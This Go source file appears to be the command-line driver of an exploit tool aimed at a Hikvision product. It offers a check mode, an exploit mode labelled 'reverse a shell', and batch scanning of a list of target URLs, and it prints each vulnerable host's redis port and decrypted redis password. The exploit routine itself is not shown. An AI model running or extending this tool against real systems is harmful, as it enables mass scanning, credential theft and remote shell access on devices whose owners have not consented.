package modules

import (
	"flag"
	"fmt"
	"log"
	"sync"
)

var (
	check         bool
	exploit       bool
	target        string
	BatchFilePath string
	Targets       []string
	wg            sync.WaitGroup
)

func Run() {
	flag.BoolVar(&check, "c", false, "check is vuln(default)")
	flag.BoolVar(&exploit, "e", false, "reverse a shell")
	flag.StringVar(&target, "u", "", "target url")
	flag.StringVar(&BatchFilePath, "f", "", "batch file path")
	flag.Parse()
	if check && exploit {
		log.Fatalln("You Can Only Specific Check Mode Or Exploit Mode")
	}
	if BatchFilePath != "" && exploit {
		log.Fatalln("Exploit Mode Can Not Use In Batch Mode")
	}
	if BatchFilePath != "" {
		Targets, err := LoadFile(BatchFilePath)
		if err != nil {
			log.Fatalln(err)
		}
		for _, target := range Targets {
			if _, _, invaild := UrlChecker(target); !invaild {
				log.Fatalln("URL Invalid.")
			}
			hik := Hik{
				Target:  target,
				Exploit: false,
			}
			hik.Run()
			if hik.canGetShell {
				fmt.Printf("redis port is %s\nredis password is %s\n", hik.redisPort, hik.redisPasswordDecrypted)
			}
		}
	} else {
		if _, _, invaild := UrlChecker(target); !invaild {
			log.Fatalln("URL Invalid.")
		}
		hik := Hik{
			Target:  target,
			Exploit: exploit,
		}
		hik.Run()
	}

}
